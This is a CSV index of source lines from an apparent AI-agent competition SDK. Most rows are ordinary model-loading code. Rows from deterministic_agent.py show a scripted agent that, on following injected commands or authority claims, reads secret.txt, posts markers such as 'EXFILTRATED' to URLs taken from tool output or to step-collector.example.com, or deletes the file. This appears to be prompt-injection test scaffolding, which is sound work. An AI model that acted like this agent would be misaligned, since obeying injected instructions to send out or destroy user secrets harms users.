relative_path,line,terms,source_text,source_line_sha256
aicomp_sdk/agents/deterministic_agent.py,153,url|data,"{""url"": url, ""data"": ""SECRET_MARKER""},",CE01087768A7749F2817D62F91878C2B4B63D6372935ECD059013EA0BF26AD43
aicomp_sdk/agents/deterministic_agent.py,160,secret.txt|path,"{""path"": ""secret.txt""},",03A81593BC97B42DFFD16FD8D1C179E38A57AB9D9E15CC3862C9E3BA97E4C22B
aicomp_sdk/agents/deterministic_agent.py,177,tool_call|fs.read|secret.txt|path,"return self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""followed_command"")",2E57E8662F8143021F010FF6B07E2DFE85499B5D6EF86D0553066133883097FF
aicomp_sdk/agents/deterministic_agent.py,181,url,matched_url = self._find_url(output),BA70B020F03ED4C2E8C5B1B40104E6BA1B55554DAF11ACCC0B5D390772A636F5
aicomp_sdk/agents/deterministic_agent.py,182,url,if matched_url is not None:,1AF9996CB9D8E27C9D4F2664407BC4E281693E525136934B5C6B71EE5EEC65DA
aicomp_sdk/agents/deterministic_agent.py,184,http.post,"""http.post"",",3AAEF860F36D8C3D8780D735F42B0A9553842BE69E141EF70A54B0067529A517
aicomp_sdk/agents/deterministic_agent.py,185,url|data,"{""url"": matched_url, ""data"": ""EXFILTRATED""},",D245388EFC9C41239252751FA54C6165A861C11243FD4850CB91E3F3AE9DF806
aicomp_sdk/agents/deterministic_agent.py,189,tool_call|secret.txt|path,"return self._tool_call(""fs.delete"", {""path"": ""secret.txt""}, ""followed_command"")",D4BE04897A2AF59B027108CEF40A0D18934CB532048B7F8AE26DF86924DFF8FA
aicomp_sdk/agents/deterministic_agent.py,201,tool_call|fs.read|secret.txt|path,"return self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""followed_authority"")",427095B6F99BC396F7B3B9B2499E6DCE8A549DFD026DBE084654AD5138266CD7
aicomp_sdk/agents/deterministic_agent.py,206,url,matched_url = self._find_url(output),BA70B020F03ED4C2E8C5B1B40104E6BA1B55554DAF11ACCC0B5D390772A636F5
aicomp_sdk/agents/deterministic_agent.py,207,url,if matched_url is not None:,1AF9996CB9D8E27C9D4F2664407BC4E281693E525136934B5C6B71EE5EEC65DA
aicomp_sdk/agents/deterministic_agent.py,209,http.post,"""http.post"",",3AAEF860F36D8C3D8780D735F42B0A9553842BE69E141EF70A54B0067529A517
aicomp_sdk/agents/deterministic_agent.py,210,url|data,"{""url"": matched_url, ""data"": ""AUTHORITY_BYPASS""},",FA4D04488C4AEC2E248C043C35441C3D189D2434D916A932318F31B5B72F6AF1
aicomp_sdk/agents/deterministic_agent.py,216,fs.read,# Look for fs.read in step 1,02527D8144B3F771F8D147120BB52A9B2F0CDA8E74575F23F8E24BEB6CCEAE6C
aicomp_sdk/agents/deterministic_agent.py,220,tool_call|fs.read|secret.txt|path,"return self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""followed_steps"")",767E8FA15CAF2B37B4C4E90A341690FAF9AE21942F205AE9940B6A1CD3429DB4
aicomp_sdk/agents/deterministic_agent.py,224,http.post,"""http.post"",",AFFA57F7E74AA111AD654C4F501DC0397FDC4A30F4315FCF49A1C2DB49E37E05
aicomp_sdk/agents/deterministic_agent.py,226,url|data,"""url"": ""https://step-collector.example.com/data"",",BF9DF7FE973B8E59D1504532F05A621E92B1EA65C9995FFC8ABB250EB8DDF6D7
aicomp_sdk/agents/deterministic_agent.py,227,data,"""data"": ""STEP_FOLLOW"",",979FF32C3E365C437A65157B98240B03710C4E175DD2180C77C11A9F61CE3C28
aicomp_sdk/agents/deterministic_agent.py,331,path,"{""path"": ""note.txt"", ""content"": ""demo""},",CED76F9715428C53EC38FCB4272C509DA2955E5172751A33D8DDBDD965501BB2
aicomp_sdk/agents/deterministic_agent.py,339,tool_call|secret.txt|path,"decision=self._tool_call(""fs.delete"", {""path"": ""secret.txt""}, ""delete_file""),",3C57EC8CFE5931747666B59EA447A3CD3A84A281EEEAD232802D9A03305D389A
aicomp_sdk/agents/deterministic_agent.py,362,http.post,"""http.post"",",AFFA57F7E74AA111AD654C4F501DC0397FDC4A30F4315FCF49A1C2DB49E37E05
aicomp_sdk/agents/deterministic_agent.py,363,url|data,"{""url"": ""https://example.invalid/collect"", ""data"": ""demo""},",552D6705221736F0DED2CF4D97288A073B47FD7C589685F39C037FAA6030E509
aicomp_sdk/agents/deterministic_agent.py,364,data,"""post_data"",",02B19955FD44D65784E9B94899E0518FB060C89A7FA8F631892AD96043053AA8
aicomp_sdk/agents/deterministic_agent.py,382,data,"""data"": {""next_call_index"": self._next_call_index},",46C54703F5BF9C71A621D7D7985275A3C88A7E74474D32ABBB5B50A9BE8397E1
aicomp_sdk/agents/deterministic_agent.py,394,data,"self._next_call_index = int(snapshot[""data""].get(""next_call_index"", 1))",0529F0157CAE00A1270B50DA1B692DF01C7F30CC015C3E0D4602F69AE85CBAC4
aicomp_sdk/agents/factory.py,41,resolve,def _resolve_verbose(verbose: bool | None) -> bool:,A056DBB1775C35741364B820567BB2A26126300230FBAE6E0944FCC6CDF866F8
aicomp_sdk/agents/factory.py,73,resolve,def _resolve_auto_factory(,A172EBC4B46EE4316FCFA0456A86182E530DF5D337E32719700961258F1AC62D
aicomp_sdk/agents/factory.py,125,resolve,resolved_selection = coerce_agent_selection(selection),E7F198F0B7B591C594A5C31D42ED77D753BF05FC23A26A2998FCEDE16061DE40
aicomp_sdk/agents/factory.py,126,resolve,resolved_verbose = _resolve_verbose(verbose),1D677D3461103DBF70734A8ECCE76061C37D459929A28CB684D60B2F0A6C34A9
aicomp_sdk/agents/factory.py,128,resolve,if resolved_selection is AgentSelection.DETERMINISTIC:,C4453991DBACF2851C16B6C76D7816623980E007CCB19A319B5A9BA40D51F2D9
aicomp_sdk/agents/factory.py,131,resolve,if resolved_selection is AgentSelection.OPENAI:,6BF36619A50639CBAE4C6BFEC59C72E099CA4F0CA89DCD2ECC1A94628DDE1CE9
aicomp_sdk/agents/factory.py,133,resolve,"return lambda: _create_openai_agent(api_key, resolved_verbose, debug_sink)",B9A4D193ECAB0B759B32990154E623A2CCCF04EC10724F27D00613DC5F2EC9AF
aicomp_sdk/agents/factory.py,135,resolve,if resolved_selection is AgentSelection.GPT_OSS:,0050A495FB30786413B10BC57C3F77411E6AC7B3373745A28F5DE7290240FE40
aicomp_sdk/agents/factory.py,139,resolve,if resolved_selection is AgentSelection.GEMMA:,9ADD267D11E8E9FC81D918C0A1C2613607D015E60DEEE26DEA4D3C5B0743CC0C
aicomp_sdk/agents/factory.py,143,resolve,if resolved_selection is AgentSelection.GEMMA_4:,A94E9268EA1B5F088061FB82C52A4EE54C785110103409880F807899EA45B970
aicomp_sdk/agents/factory.py,147,resolve,"return _resolve_auto_factory(resolved_verbose, debug_sink)",C4CDE7ECA0123C37315BA1B03840B72D5EFA046432F877AFC7533866043371E5
aicomp_sdk/agents/gemma4_agent.py,25,normalize,"normalize_parsed_response,",57585B6C140C76BC2289A3B6ADD407F07BD756221C21EE500F432BF260A44A60
aicomp_sdk/agents/gemma4_agent.py,58,path,"model_path: str | None = None,",26FE7980BC54833A1C224CDB96963467C3E83F0E97BE0DA42DA43D44BE78FF9E
aicomp_sdk/agents/gemma4_agent.py,73,path,"model_path_env_var=""GEMMA4_MODEL_PATH"",",F87A8B5BC57F34B4A382D595D796D89C127FD17BC7494ECB0EA8A8AE478F08E2
aicomp_sdk/agents/gemma4_agent.py,74,path,"model_path=model_path,",D9FF4E0B6FBDB8C914A0F3E785029C6E2505595DAA6FCFC0AA52FB6C76032E3B
aicomp_sdk/agents/gemma4_agent.py,90,path,"model_path: str | None = None,",26FE7980BC54833A1C224CDB96963467C3E83F0E97BE0DA42DA43D44BE78FF9E
aicomp_sdk/agents/gemma4_agent.py,104,path,"model_path=model_path,",9DC4912318F133DE8E86C307B12D1617C16140F1900780DC4B26D68BDB642037
aicomp_sdk/agents/gemma4_agent.py,233,normalize,return normalize_parsed_response(,442F7901A41BB113BAB7FF5AD7689D292C8C1D9D7EADB9262691F26CC1CCA8F7
aicomp_sdk/agents/gemma4_agent.py,251,normalize,return normalize_parsed_response(,A6F514E443FD0F6B0873C1DD80098A1FD25F779955E49C160A7A9D4F0A013DA5
aicomp_sdk/agents/gemma4_agent.py,273,resolve,resolved_backend = backend or build_gemma4_backend(),A9786E24363D6326361316751950AB401D0973190650B86B2617223510FCEB91
aicomp_sdk/agents/gemma4_agent.py,274,resolve,"resolved_profile = profile or HFModelProfile(instruction_role=""system"")",06A0C6700607AC237994A83618302DE1149A7621D915AE78BF42773E3D10E0B2
aicomp_sdk/agents/gemma4_agent.py,275,resolve,resolved_parser = parser or build_gemma4_parser(,05FACC98F51FC825AE86225C10BF2A335F1328561A85627C201F93E5135DF364
aicomp_sdk/agents/gemma4_agent.py,276,resolve,"getattr(resolved_backend, ""processor"", None),",BE442CFEA734722688D65822BEBB79EEB60F824B2D8BB5724896144C0BB83F89
aicomp_sdk/agents/gemma4_agent.py,277,resolve,"model_id=resolved_backend.config.model_id,",0E1C5E304BDA8EC94D5B582DC99949FAC0E746A3407D73FDF023291D7A274CCD
aicomp_sdk/agents/gemma4_agent.py,280,resolve,"if isinstance(resolved_backend, LlamaCppChatTemplateBackend):",6141D76F2531B9A02A7D78E5A31899B5681142BEB1868881B114179725932357
aicomp_sdk/agents/gemma4_agent.py,283,resolve,"backend=resolved_backend,",1E6A5A9A6ED13C529ED2A13A18BD51C991EB59E709ACB0036CDFE5B744BC812A
aicomp_sdk/agents/gemma4_agent.py,284,resolve,"profile=resolved_profile,",004EAD7FBF2A52EC0447E19B47831CB251C41F6FDD1F16CFD716D5A379123D05
aicomp_sdk/agents/gemma4_agent.py,285,resolve,"parser=resolved_parser,",70DDE71FC5808991F4EB7B310D644D8F10A57D0796E511348C267E9ABFCDF08D
aicomp_sdk/agents/gemma_agent.py,47,path,"model_path: str | None = None,",26FE7980BC54833A1C224CDB96963467C3E83F0E97BE0DA42DA43D44BE78FF9E
aicomp_sdk/agents/gemma_agent.py,62,path,"model_path_env_var=""GEMMA_MODEL_PATH"",",34C0988E26FEEB031B3C5A1E394D4257D0F9462A30384536EE624412373261CE
aicomp_sdk/agents/gemma_agent.py,63,path,"model_path=model_path,",D9FF4E0B6FBDB8C914A0F3E785029C6E2505595DAA6FCFC0AA52FB6C76032E3B
aicomp_sdk/agents/gemma_agent.py,79,path,"model_path: str | None = None,",26FE7980BC54833A1C224CDB96963467C3E83F0E97BE0DA42DA43D44BE78FF9E
aicomp_sdk/agents/gemma_agent.py,93,path,"model_path=model_path,",9DC4912318F133DE8E86C307B12D1617C16140F1900780DC4B26D68BDB642037
aicomp_sdk/agents/gemma_agent.py,224,resolve,resolved_backend = backend or build_gemma_backend(),A78CC624F99B19B8D3C875D778BF5EA56D88BFAAA58B445084BD3ACCA046B297
aicomp_sdk/agents/gemma_agent.py,225,resolve,"resolved_profile = profile or HFModelProfile(instruction_role=""system"")",06A0C6700607AC237994A83618302DE1149A7621D915AE78BF42773E3D10E0B2
aicomp_sdk/agents/gemma_agent.py,226,ToolCall|resolve,resolved_parser = parser or JsonEnvelopeToolCallParser(),28D2D96094817B3BACF621B74E63DDBFAD9EEBE9BF8100E07F730460D917BC53
aicomp_sdk/agents/gemma_agent.py,228,resolve,"backend=resolved_backend,",1E6A5A9A6ED13C529ED2A13A18BD51C991EB59E709ACB0036CDFE5B744BC812A
aicomp_sdk/agents/gemma_agent.py,229,resolve,"profile=resolved_profile,",004EAD7FBF2A52EC0447E19B47831CB251C41F6FDD1F16CFD716D5A379123D05
aicomp_sdk/agents/gemma_agent.py,230,resolve,"parser=resolved_parser,",70DDE71FC5808991F4EB7B310D644D8F10A57D0796E511348C267E9ABFCDF08D
aicomp_sdk/agents/gpt_oss_agent.py,20,normalize,"normalize_parsed_response,",57585B6C140C76BC2289A3B6ADD407F07BD756221C21EE500F432BF260A44A60
aicomp_sdk/agents/gpt_oss_agent.py,21,normalize,"normalize_tool_arguments,",5D5F8C0A1F2943ACF814564ED0FA78DCDE0BBE6A657EC47FB4F54D66B8BEFC74
aicomp_sdk/agents/gpt_oss_agent.py,46,path,"model_path: str | None = None,",26FE7980BC54833A1C224CDB96963467C3E83F0E97BE0DA42DA43D44BE78FF9E
aicomp_sdk/agents/gpt_oss_agent.py,61,path,"model_path_env_var=""GPT_OSS_MODEL_PATH"",",C89F57EDBBDE5833AC51C5EB8B5B7A4F3B2181B5D603D5A926B7322460F090B3
aicomp_sdk/agents/gpt_oss_agent.py,62,path,"model_path=model_path,",D9FF4E0B6FBDB8C914A0F3E785029C6E2505595DAA6FCFC0AA52FB6C76032E3B
aicomp_sdk/agents/gpt_oss_agent.py,78,path,"model_path: str | None = None,",26FE7980BC54833A1C224CDB96963467C3E83F0E97BE0DA42DA43D44BE78FF9E
aicomp_sdk/agents/gpt_oss_agent.py,92,path,"model_path=model_path,",9DC4912318F133DE8E86C307B12D1617C16140F1900780DC4B26D68BDB642037
aicomp_sdk/agents/gpt_oss_agent.py,111,normalize,"normalized_model_id = model_id.lower().replace(""_"", ""-"")",42A95F0B675F4997B0C05633EB1B419886E4D9ED9CE30AFEC06311F7657630E1
aicomp_sdk/agents/gpt_oss_agent.py,112,normalize,"if ""gpt-oss"" in normalized_model_id:",49072DC920FCFB5F092B5E4D53995415C38A31575967472129C7D4251E3A6BBE
aicomp_sdk/agents/gpt_oss_agent.py,127,normalize,return normalize_parsed_response(,A6F514E443FD0F6B0873C1DD80098A1FD25F779955E49C160A7A9D4F0A013DA5
aicomp_sdk/agents/gpt_oss_agent.py,149,resolve,resolved_backend = backend or build_gpt_oss_backend(),C239B2A65D120176D6E348CAF7016ADD6DB5935F3967D9534ED3AB0F79978EBB
aicomp_sdk/agents/gpt_oss_agent.py,150,resolve,"resolved_profile = profile or HFModelProfile(instruction_role=""system"")",06A0C6700607AC237994A83618302DE1149A7621D915AE78BF42773E3D10E0B2
aicomp_sdk/agents/gpt_oss_agent.py,151,resolve,resolved_parser = parser or build_gpt_oss_parser(,F88C5318C3FD71A67C68092B24D807DDCA48B1647570A8C8B113EB8895B282FA
aicomp_sdk/agents/gpt_oss_agent.py,152,resolve,"getattr(resolved_backend, ""tokenizer"", None),",D8CFFDEB499E1BEA69053262B4354868CADD9226D34E1E2B7374EE0D970C8BA1
aicomp_sdk/agents/gpt_oss_agent.py,153,resolve,"model_id=resolved_backend.config.model_id,",0E1C5E304BDA8EC94D5B582DC99949FAC0E746A3407D73FDF023291D7A274CCD
aicomp_sdk/agents/gpt_oss_agent.py,156,resolve,"backend=resolved_backend,",1E6A5A9A6ED13C529ED2A13A18BD51C991EB59E709ACB0036CDFE5B744BC812A
aicomp_sdk/agents/gpt_oss_agent.py,157,resolve,"profile=resolved_profile,",004EAD7FBF2A52EC0447E19B47831CB251C41F6FDD1F16CFD716D5A379123D05
aicomp_sdk/agents/gpt_oss_agent.py,158,resolve,"parser=resolved_parser,",70DDE71FC5808991F4EB7B310D644D8F10A57D0796E511348C267E9ABFCDF08D
aicomp_sdk/agents/gpt_oss_agent.py,199,normalize,"arguments = normalize_tool_arguments(match.group(""arguments"").strip())",D43E70EFD6CAB58ED3CABFE68B03C02D6F323166E147EBDA6953F1B8346359B4
aicomp_sdk/agents/hf_chat_template/__init__.py,11,normalize,"normalize_parsed_response,",57585B6C140C76BC2289A3B6ADD407F07BD756221C21EE500F432BF260A44A60
aicomp_sdk/agents/hf_chat_template/__init__.py,12,normalize,"normalize_tool_arguments,",5D5F8C0A1F2943ACF814564ED0FA78DCDE0BBE6A657EC47FB4F54D66B8BEFC74
aicomp_sdk/agents/hf_chat_template/__init__.py,39,normalize,"""normalize_parsed_response"",",B6B00546F447F9C65CD90809522AE108FA04A26ED7AC3CB14CF03C6DEEFE0AFE
aicomp_sdk/agents/hf_chat_template/__init__.py,40,normalize,"""normalize_tool_arguments"",",2246A61E513C2F3315E4F84DF2798BADFDA94BE163869E9DFFCB1B5D8C9C0908
aicomp_sdk/agents/hf_chat_template/agent.py,5,data,from dataclasses import dataclass,9E63EE62217C139D62FF0AA136C668CDCD631EDD06B7F3DCADFDF769E2EB1FAA
aicomp_sdk/agents/hf_chat_template/agent.py,35,normalize,from .response_parsing import normalize_parsed_response,AC5E0F8DF95C998D4C5A3D20FDC2D5DAE3BC451E64401D1F4FCF603B762CFC9D
aicomp_sdk/agents/hf_chat_template/agent.py,46,data,@dataclass(frozen=True),6B38C9A9ED64FCD7602BBA1EFAE5A3586F70A4A4743870B5A2C05E97C0612544
aicomp_sdk/agents/hf_chat_template/agent.py,67,data,"def from_snapshot_data(cls, data: object) -> Self:",41080142DF45E1B5797ADFC1725E129FE0D233F4662ED4F2BF907D4286D07179
aicomp_sdk/agents/hf_chat_template/agent.py,68,data,"if not isinstance(data, Mapping):",6B5C5D0797E0F34BD1A71C1C97CE2F44597D98E5929BE2FDF83A073AB6FB70C7
aicomp_sdk/agents/hf_chat_template/agent.py,69,data,"raise AgentStateVersionError(""Invalid agent snapshot data: expected object"")",315A6D028D72FEF81A88CE896F8D8B8B4C4C5C38540829CCB11747F851F5B037
aicomp_sdk/agents/hf_chat_template/agent.py,73,data,"data,",A7E3F3C049EE0F99858F3EF576DD77A67571E21A9D73C5A356D0EE63C1483051
aicomp_sdk/agents/hf_chat_template/agent.py,77,data,"data,",A7E3F3C049EE0F99858F3EF576DD77A67571E21A9D73C5A356D0EE63C1483051
aicomp_sdk/agents/hf_chat_template/agent.py,85,data,"def _require_positive_int(data: Mapping[str, object], *, key: str) -> int:",487181AF9F693AE549E62C8682AE939DEB40B97B7523E76C2C4784D85716CB6B
aicomp_sdk/agents/hf_chat_template/agent.py,86,data,if key not in data:,58FBB37DDB2EDD6111AF04B2FA7554231C0E1DA46D091C14C561E42DE3C1BCAF
aicomp_sdk/agents/hf_chat_template/agent.py,88,data,value = data[key],7F0761A1531AE25C6A526F0DB6652DD3DB5019C6FEEFB10612D4D9D95C6080CC
aicomp_sdk/agents/hf_chat_template/agent.py,203,data,"""data"": dict(snapshot[""data""]),",2F87349CA09631C36FB63C28304C9E87FCBD74208B04E07209B47446244C318A
aicomp_sdk/agents/hf_chat_template/agent.py,217,data,"""data"": dict(snapshot[""data""]),",2F87349CA09631C36FB63C28304C9E87FCBD74208B04E07209B47446244C318A
aicomp_sdk/agents/hf_chat_template/agent.py,307,data,"""data"": {",14DF100369C8AB2B8A42D2D3FA2F2DF3733A84D0D049589B40E02DF120E705B1
aicomp_sdk/agents/hf_chat_template/agent.py,322,data,"self._state = HFChatTemplateAgentState.from_snapshot_data(snapshot[""data""])",C3B6C469E159B48E2C1F9C0D9533A31FEF09E4835C22A8CCA7519360109BB41B
aicomp_sdk/agents/hf_chat_template/agent.py,342,normalize,return normalize_parsed_response(,A6F514E443FD0F6B0873C1DD80098A1FD25F779955E49C160A7A9D4F0A013DA5
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,25,path,def from_model_path(,DBB38D91CC353C2692A5B582C1443634AF8D50162D0DACF0BF8DF5CE7E2AB9DD
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,28,path,"model_path: str,",2859507EF7CE1B678DFC53F678E7C760615CC9CA2F8D20EE01B7D07E4BD5AD8B
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,37,resolve,resolved_llama_cls = llama_cls,DBB1A2F72428D5E507FD63C3E5959B82D2DF54D699BA97FC0B8B415B9DABD35C
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,38,resolve,if resolved_llama_cls is None:,060025489D3038C40C578DF123B192C4C454C8014162DC8360F4C86C934AF8FC
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,41,resolve,resolved_llama_cls = Llama,EA921FA6329D3B71C7E18B3D5547996118EF1FF1605FD7130631DB374BF69A06
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,43,resolve,llm = resolved_llama_cls(,89F6775826209AB925280FC37BFC40577DE6E914FC7B4F3C8182FC285DB34919
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,44,path,"model_path=model_path,",9DC4912318F133DE8E86C307B12D1617C16140F1900780DC4B26D68BDB642037
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,105,resolve,"resolved_finish_reason = finish_reason if isinstance(finish_reason, str) else None",60AE19A75E0E1AE1B3568C799692DB14AAC19E8253A74859F04A951A65CF5917
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,112,resolve,"return """", resolved_finish_reason, parsed_response",6A4F35000919843D44CD13B36389CD66AB44F1221C23C17DC472847024E5F173
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,113,resolve,"return str(content), resolved_finish_reason, parsed_response",46FDAC0DB8DF57B5737932A994A2262DE3F00B9293496339D0DD3F810A5B8630
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,117,resolve,"return """", resolved_finish_reason, None",ECB066A297757C2A53B12F37A70ED65AD70FAF752A06D58B630248D9B68D4DCE
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,118,resolve,"return str(text), resolved_finish_reason, None",2C329B7A0297F9F69501E320982AEE241611D84A580C972F327995B86DC2C574
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,142,normalize,normalized = dict(message),28F68A8D304F5F22704DFC8CB90DB03B865767A0CBEDE8F7A08715F88EA52480
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,143,tool_call|normalize,"normalized[""tool_calls""] = _to_openai_tool_calls(message[""tool_calls""])",1CA05CA4EE12A8CCB32DF518903437B860028DD1B840F837FE5093462BE96300
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,144,normalize,return normalized,232157CECD9C124317C99BCEC4E2C9C31E6C3DA898CAECEBE5183AA233B31613
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,146,normalize,normalized = {,3B884DA235561828E5913FABEC4471A6BE1EA4D7A10F4930389A4E03D1CFF411
aicomp_sdk/agents/hf_chat_template/backends/llama_cpp.py,152,tool_call|normalize,"normalized[""tool_call_id""] = tool_call_id",FB816523AF86D3A7B51FF7B1854463878FA7E5577D36981DA2BB8C164C102A61
